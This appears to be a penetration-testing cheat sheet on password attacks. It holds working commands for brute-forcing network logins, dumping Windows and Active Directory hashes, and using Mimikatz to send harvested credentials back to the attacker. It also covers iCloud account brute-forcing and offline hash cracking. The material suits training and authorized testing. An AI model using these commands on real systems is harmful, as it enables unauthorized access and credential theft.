# Password Cracking

Password Cracking Notes

### Definition

#### Password Cracking

Password cracking is a technique used for discovering passwords from encrypted or hashed data to plaintext data. Attackers may obtain the encrypted or hashed passwords from a compromised computer or capture them from transmitting data over the network. Once passwords are obtained, the attacker can utilize password attacking techniques to crack these hashed passwords using various tools.

#### Password Guessing

Password guessing is a method of guessing passwords for online protocols and services based on dictionaries. it's considered time-consuming and opens up the opportunity to generate logs for the failed login attempts. A password guessing attack conducted on a web-based system often requires a new request to be sent for each attempt, which can be easily detected. It may cause an account to be locked out if the system is designed and configured securely.

#### Password Dictionary Attack

A dictionary attack is a technique used to guess passwords by using well-known words or phrases. The dictionary attack relies entirely on pre-gathered wordlists that were previously generated or found. It is important to choose or create the best candidate wordlist for your target in order to succeed in this attack.

#### Password Brute-Force Attack

Brute-forcing is a common attack used by the attacker to gain unauthorized access to a personal account. This method is used to guess the victim's password by sending standard password combinations. The main difference between a dictionary and a brute-force attack is that a dictionary attack uses a wordlist that contains all possible passwords. In contrast, a brute-force attack aims to try all combinations of a character or characters.

#### Rule-Based Attacks

Rule-Based attacks are also known as `hybrid attacks`. Rule-Based attacks assume the attacker knows something about the password policy. Rules are applied to create passwords within the guidelines of the given password policy and should, in theory, only generate valid passwords. Using pre-existing wordlists may be useful when generating passwords that fit a policy.

#### Password Spraying Attack

A password spraying attack is a special type of brute force or dictionary attack designed to avoid being locked out. An automated program starts with a large list of targeted user accounts. It then picks a password and tries it against every account in the list. It then picks another password and loops through the list again.

#### Pass The Hash

In a pass the hash attack, the attacker discovers the hash of the user’s password and then uses it to log on to the system as the user. Any authentication protocol that passes the hash over the network in an unencrypted format is susceptible to this attack.

#### Rainbow Table Attacks

Rainbow table attacks are a type of attack that attempts to discover the password from the hash. A rainbow table is a huge database of possible passwords with the precomputed hashes for each. An attacker would have a hold of some password hashes then they would run a program that compares the hashes against the hashes in the rainbow tables and if a match occurs the plain text password is given to the attacker.

### Online Password Attacks

Online password attacks involve guessing passwords for networked services that use a username and password authentication scheme, including services such as HTTP, SSH, VNC, FTP, SNMP, POP3, etc.

#### http login forms: example on Wordpress

```
root@kali:hydra -l users.txt -P /usr/share/wordlists/rockyou.txt -u 192.168.56.134 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location
```

\#Anotherexample

```
root@kali:hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:F=INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
Don’t forget to inspect the login form for the required parameters and supply the string that indicates invalid login attempt.
```

Remember to use `http-get-form` or `http-form-post` depending on the request type.

It also is important to eliminate false positives by specifying the 'failed' condition with `F=`

And success conditions, `S=` You will have more information about these conditions by analyzing the webpage or in the enumeration stage! What you set for these values depends on the response you receive back from the server for a failed login attempt and a successful login attempt. For example, if you receive a message on the webpage `Invalid password` after a failed login, set `F=Invalid Password`.

#### Router login

```
root@kali:hydra -l admin -P /usr/share/wordlists/dic_files/file_1.txt  http-post-form 192.168.2.1/login.cgi:user=^USER^&password=^PASS^&login-php-submit-button=Login:Not Logged In
```

Note For router login cracking : you should view the source code of the login page and look for the field \[ form> ] and examine the \[method ] field if it is " post " or " get " then you should look the field in the code that looks like this

```
<input name="password" type="password" class="text required" id="userpassword" size="20" maxlength="15">
```

Also you have to put the phraase which appears when a wrong information provided to the router interface like " username or password does not match "

#### Http based directory

```
root@kali:medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```

#### SSH

```
root@kali:hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
```

#### RDP

\[1] With Hydra

```
hydra -V -f -L userlist.txt -P wordlist.txt rdp://ip
```

\[2] With Crowbar

```
root@kali:Crowbar.py -b rdp -s [ip or ip-range] -u [username or username-list] -p [password or password-list]
```

#### FTP

\[1] With Hydra

```
hydra -l root -P wordlist.txt ftp://ip 
```

\[2] With FTPncrack

```
ftpncrack -p 21 --user root -P passwords.txt ip
```

\[3] With Medusa

```
medusa -u root -P wordlist.txt -h ip -M ftp
```

#### IMAP

\[1] With Hydra

```
hydra -l USERNAME -P wordlist.txt -f ip imap -V​
```

\[2] With nmap

```
​nmap -sV --script imap-brute -p <PORT> <IP>
```

#### SNMP

We aim to brute force community strings. \[1] Hydra

```
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt ip snmp
```

\[2] onesixtyone

```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp_onesixtyone.txt ip
```

#### LDAP

```
hydra -L users.txt -P pass.txt ip ldap2 -V -f
```

#### Mysql

```
hydra -L usernames.txt -P pass.txt ip mysql
```

#### OracleSQL

\[1] With Odat.py

```
./odat.py passwordguesser -s $SERVER-IP -d $SID
```

And below we supply a wordlist

```
./odat.py passwordguesser -s $SERVER-IP -p $PORT --accounts-file users.txt
```

#### POP3

```
hydra -L userlist.txt -P pass.txt -f ip pop3 -V
```

#### Postgresql

\[1] With Hydra

```
hydra -L userlist.txt –P pass-list.txt ip postgres
```

\[2] With Medusa

```
medusa -h ip –U userlist.txt –P pass-list.txt –M postgres
```

#### rLogin

```
hydra -L userlist.txt –P pass-list.txt rlogin:ip -v -V
```

#### VNC

\[1] With Hydra

```
hydra -L userlist.txt –P pass-list.txt -s port ip 
```

\[2] With medusa

```
​medusa -h ip –u root -P pass-list.txt –M 
```

\[3] With ncrack

```
ncrack -V --user root -P pass-list.txt ip:port
```

#### SMB

\[1] With crackmapexec

```
root@kali:Crackmapexec smb -I [ip] -u [username list or single username] -p [password list – or single password]
```

\[2] With \[Metasploit] Module use

```
auxiliary/scanner/smb/smb_login
```

```
#msf5 > use auxiliary/scanner/smb/smb_login                                                                    
#msf5 auxiliary(scanner/smb/smb_login) > set pass_file wordlist                                 
#pass_file => wordlist

#msf5 auxiliary(scanner/smb/smb_login) > set USER_file users.txt 
#USER_file => users.txt 

#msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS domain.com                                                                    
#RHOSTS => domain.com 

#msf5 auxiliary(scanner/smb/smb_login) >    
#msf5 auxiliary(scanner/smb/smb_login) > run
```

\[3] With acccheck

```
acccheck -v -t IP -u username -P path-to-wordlist
```

#### Port 5985 Windows Remote Management Cracking (winrm)

```
root@kali:Crackmapexec winrm -I [ip] -u [username list or single username] -p [password list – or single password]
```

#### Active Directory Brute Force

**Checking if a pair of active directory credentials work on other domain-joined machines**

```
<root@kali:Crackmapexec -u [username] -p [password] [ip1] [ip2] [ip3] [dc-ip]>
```

ips; are the Ips of the domain joined machines.

**Checking the credentials on a WORKGROUP machines and not domain joined.**

The below command is ran from a non-Active directory machine. In most cases it can be a windows server machine

```
root@kali:Crackmapexec -u [username] -p [password] [ip1] [ip2] [ip3]
```

Or with NTLM Hash

```
root@kali:Crackmapexec winrm -i [ip] -u [username list or single username] -H [NTLM HASH]
```

**Harvesting the windows administrator account password with crackmapexec**

```
root@kali:crackmapexec -u [username] -p [password] -d WORKGROUP –-sam [ip of the target machine from which the administrator account hash will be dumped]
```

**Harvesting passwords of other windows machines with crackmapexec + Mimikatz**

```
root@kali:crackmapexec -u administrator -H [Hash] -d WORKGROUP [ip1] [ip2] [ip3] -M mimikatz - server=http --server-port=80
```

In this command, we used the administrator hash to launch an authenticated process on the remote machines to crack the local accounts passwords and send it over port 80 to us. This command will only work if the administrator has logged in to the remote machines before or if the machines are part of an Active Directory structure.

**Dumping Active Directory Users’s hashes with secretsdump.py given we have acquired the plain text password of a valid user**

```
root@kali:Secretsdump.py pentesting.local/user:’password’@[ip]
```

**Given ntds.dit and registery file system \[Active Directory]**

```
<root@kali:python secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL > backup_ad_dump > 
```

OR

```
root@kali:pythonsecretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit -hashes lmhash:nthash LOCAL -output hashes-output 
```

**Brute forcing a user hash given a list of users and hashes by performing retrieving TGTs \[Active Directory]**

Use the script below to iterate through the usernames and hashes. GetTGT.py is within impacket

```
#!/bin/bash 
#Request the TGT with hash

for i in $(cat wordlists/valid.usernames) 
do 
        for j in $(cat wordlists/hashes.ntds) 
        do 
                echo trying $i:$j 
                echo 
                getTGT.py htb.local/$i \-hashes $j:$j    
                echo 
                sleep 5 
        done 
done
```

### Offline Password Attacks

**Definition** Offline password attacks attempt to discover passwords from a captured database or captured packet scan. For example, when attackers hack into a system or network causing a data breach, they can download entire databases. They then perform offline attacks to discover the passwords contained within these downloaded databases.

#### Creating Wordlists

Building a custom wordlist can be particularly useful if you have gathered a lot of information about your target. Common words, catchphrases, and even personal information from staff members can be combined into a dictionary that will provide a greater chance of cracking passwords than a standard dictionary or generic wordlist.

**CUPP**

CUPP is an automatic and interactive tool written in Python for creating custom wordlists. For instance, if you know some details about a specific target, such as their birthdate, pet name, company name, etc., this could be a helpful tool to generate passwords based on this known information. CUPP will take the information supplied and generate a custom wordlist based on what's provided. There's also support for a 1337/leet mode, which substitutes the letters a, i,e, t, o, s, g, z  with numbers. For example, replace a  with 4  or i with 1.

**Creating a wordlist tied to a specific profile or individual target**

```
root@kali:python cupp.py -i
Follow the prompt and enter the details of the target to 
generate the wordlist
```

**Seq**

**Creating a wordlist of numbers**

From 00 to 99

```
seq -w 00 99 > nums.txt
```

From 0 to 100

```
seq -w 0 100 > nums.txt
```

**Crunch**

```
root@kali:crunch [minimum number of characters] [max] [character set] -o [path to output file]
```

Generating a wordlist where you got part of the password or a pattern.

```
root@kali:crunch [minimum number of characters] [max] [character set] -o [path to output file] -t [pattern]
```

The below creates a wordlist containing all possible combinations of 2 characters, including 0-4 and a-d. We can use the -o argument and specify a file to save the output to.

```
crunch 2 2 01234abcd -o output.txt
```

Generating wordlist with 8 min and 8 maximum characters, one capital letter, two lower case letters, two special characters and three numeric characters

```
root@kali:crunch 8 8 -t ,@@^^%%% 
```

crunch also lets us specify a character set using the `-t` option to combine words of our choice. Here are some of the other options that could be used to help create different combinations of your choice:

`@` - lower case alpha characters

`,` - upper case alpha characters

`%` - numeric characters

`^` - special characters including space

For example, if part of the password is known to us, and we know it starts with pass and follows two numbers, we can use the % symbol from above to match the numbers. Here we generate a wordlist that contains `cat` followed by 2 numbers

```
crunch 5 5 -t cat%%%
```

**Cewl**

Generating a wordlist based on a target website and minimum number of characters

```
root@kali:cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
```

**Creating wordlists with Hashcat**

Hashcat can also be used to create wordlists depending on a specific criteria. hashcat has `charset` options that could be used to generate your own combinations. The charsets can be found in hashcat `help` options. For example the charset `?d?d?d?d` the `?d` tells hashcat to use a digit. In our case, `?d?d?d?d` for four digits starting with 0000 and ending at 9999.

```
hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d
```

`-a 3`  sets the attacking mode as a brute-force attack.

#### Username Wordlists

We can generate a possible list of usernames using first and last name. Download the tool below

```
git clone https://github.com/therodri2/username_generator.git
```

Then you can create a file named `names.lst` and inside it you can store first and last names of the targets. It could be similar to the below

```
John Smith
Bill Gates
...
...
...
```

Then launch the below command to create a username list based off the names list above

```
python3 username_generator.py -w names.lst
```

#### Cracking Passwords

**ZIP Files**

\[1] fcrackzip

```
root@kali:fcrackzip -b --method 2 -D -p ~/Desktop/rockyou.txt -v file.zip

b: brute force
D: using dictionary list
P: password list
```

\[2] John

```
root@kali:zip2john backup.zip > hash 
root@kali: john hash --wordlist=path
```

**7z Files**

This can be accomplished with 7z2john but first you need to install the requirements as below

```
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl

apt-get install libcompress-raw-lzma-perl
```

And then run

```
./7z2john.pl file.7z > output
```

#### Cracking a password hash, lets say a user hash, stored in a file in your system

```
root@kali:john --wordlist=rockyou.txt root_password
```

#### Cracking Linux root password with shadow and passwd file provided

```
root@kali:unshadow shadow passwd > output.txt
root@kali:john output.txt
#OR 
john --rules --wordlist=wordlist.txt output.txt
```

#### Cracking windows passwords with SAM and SYSTEM provided from system32/config

```
root@kali:samdump2 system sam
root/hashes/filehashes.txt>
root@kali:john /root/hashes/filehashes.txt
```

#### Cracking password of PDF Files

```
root@kali:pdf2john.py [target file] > [ output file – result is hash] 
root@kali: john [ output file – contains resulted hash ]
```

#### Crack Windows hashes with NT Format

```
root@kali:sudo john hash.txt --format=NT
```

#### Crack SSH Private keys id\_rsa

```
#convert the key to hash
ssh2john id_rsa > key.hash

#use john to crack the hash
john --wordlist=rockyou.txt key.hash
```

#### Editing John the ripper password rules by adding double digits to each tried password.

This is accomplished by editing /etc/john/john.conf and locating \[List.Rules:Wordlist] to add the following at the end of it Add two numbers to the end of each password

```
$[0-9]$[0-9]
```

#### Activating the rules to crack the passwords and outputting them

```
root@kali:john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
```

#### Cracking hashes with hashcat

```
root@kali:hashcat -m [ hashtype – usually a number] -a [ the number of the attack mode ]  [ target file.txt ] [ wordlist.txt]
```

targetfile.txt: contains your hashes

#### Identify the type of hash

\[1] With Hashid

```
root@kali:hashid c43ee559d69bc7f691fe2fbfe8a5ef0a
```

\[2] With findmyhash

```
findmyhash LM -h hash
```

#### Cracking the hash of zip file with Hashcat

```
root@kali:hashcat -m 17220 hash /usr/share/wordlists/rockyou.txt>
```

#### Cracking MD5 hash with John

```
john --wordlist=/usr/share/wordlists/rockyou.txt -format=Raw-MD5 cracked.txt
```

#### Cracking NTLM Hash captured from wireshark

Use the following formula to store the NTLM Hash in a text file

```
username::domain:ServerChallenge:NTProofstring:modifiedntlmv2response
```

then with hash cat

```
hashcat -m 5600 hash.txt rockyou.txt 
```

#### Cracking type 7 cisco passwords

We use this online tool

```
https://www.ifm.net.nz/cookbooks/passwordcracker.html
```

#### Cracking a keepass database

First we extract the hash

```
keepass2john file.kdbx > hash
```

Then using hashcat or john the ripper to crack the hash \[John]

```
john --format=KeePass --wordlist=/usr/share/dict/rockyou.txt hash
```

\[Hashcat] file.hash is the file containing the hash to crack.

```
hashcat -m 13400 file.hash /usr/share/dict/rockyou.txt
```

#### Cracking Mozilla Thunderbird database password

Mozilla Thunderbird is an email client like outlook.\
First we locate the database file \[.db] and if there is a \[login.json] we make a copy of it.

**Method one: Using john the ripper**

we convert the database file \[key.db] into \[key.db.john]

```
mozilla2john.py key.db > key.db.john
```

Then use john to crack the password

```
john key.db.john -w /usr/share/wordlists/rockyou.txt
```

You should be able then to move all the files under the thunerbird foler profile \[normally under /user/.thunderbird/default] into a new profile and open it in Thunderbird. Then:

```
launch firebird, and hit alt+e to get to edit -> preferences -> security -> saved passwords -> show passwords
```

**Method Two: Using Firepwd**

Firepwd extracts passwords stored in Mozilla products, namely Firefox and Thunderbird. Link

```
https://github.com/lclevy/firepwd
```

Make sure the database file \[key.db], \[login.json] and any \[sqlite] file are there. You also need the master password of the database file. If you don't have then go back to method one and crack it with John.

```
$ python firepwd.py -p [master pass if any] [key.db]
```

#### Cracking Passwords Using Rules

Rule-Based attacks are also known as hybrid attacks. Rule-Based attacks assume the attacker knows something about the password policy. Rules are applied to create passwords within the guidelines of the given password policy and should, in theory, only generate valid passwords. Using pre-existing wordlists may be useful when generating passwords that fit a policy — for example, manipulating or 'mangling' a password such as 'password': `p@ssword, Pa$$word, Passw0rd, and so on.`

Password rules in john the ripper.

```
cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
```

Let's say we want to create a wordlist based on a specific password such as `1235TTtt@` and using the `best64` rules. We can use the below command to generate a wordlist `pass.txt`.

```
john --wordlist=/tmp/pass.txt --rules=best64 --stdout | wc -l
```

Creating Custom rules in John The Ripper. First we locate the config file

```
nano /etc/john/john.conf
```

Then we create a name for the rule and put the below at the end of the config file.

```
[List.Rules:rule-name]
```

After we have chosen the name, we can customize the ruleset. Let's say we wanted to create a custom wordlist from a pre-existing dictionary with custom modification to the original dictionary. The goal is to add special characters (ex: !@#$\*&) to the beginning of each word and add numbers 0-9 at the end. The format will be as follows:

\[symbols]word\[0-9]

```
[List.Rules:htb]
Az"[0-9]" ^[!@#$]
```

`Az` represents a single word from the original wordlist/dictionary using -p.

`"[0-9]"` append a single digit (from 0 to 9) to the end of the word. For two digits, we can add "\[0-9]\[0-9]"  and so on. &#x20;

`^[!@#$]` add a special character at the beginning of each word. ^ means the beginning of the line/word. Note, changing ^ to $ will append the special characters to the end of the line/word.

### Password Spraying

Password spraying attack targets many usernames using one common weak password, which could help avoid an account lockout policy.

Common and weak passwords often follow a pattern and format. Some commonly used passwords and their overall format can be found below.

* The current season followed by the current year (SeasonYear). For example, **Fall2020**, **Spring2021**, etc.
* The current month followed by the current year (MonthYear). For example, **November2020**, **March2021**, etc.
* Using the company name along with random numbers (CompanyNameNumbers). For example, HTB01, HTB02.

### Mobile Devices

#### iPhone

iBrute uses top 500 RockYou leaked passwords, which satisfy appleID password policy to crack iCloud accounts. It also relies on vulnerable versions of 'Find my iPhone service'.

```
git clone https://github.com/hackappcom/ibrute
```

You have to edit `mails.txt` file with the iCloud IDs you want to brute force then just run the below

```
id_brute.py
```

### Online Resources

#### Online Hash Cracking

```
https://crackstation.net/
https://hashkiller.co.uk/
https://www.onlinehashcrack.com/
http://c3rb3r.openwall.net/mdcrack/
```

#### Default Passwords

```
https://cirt.net/passwords
https://default-password.info/
https://datarecovery.com/rd/default-
```

#### Common Weak Password Lists

```
https://github.com/danielmiessler/SecLists/tree/master/Passwords
```

#### Other Password Tools

```
https://lastbit.com/
```
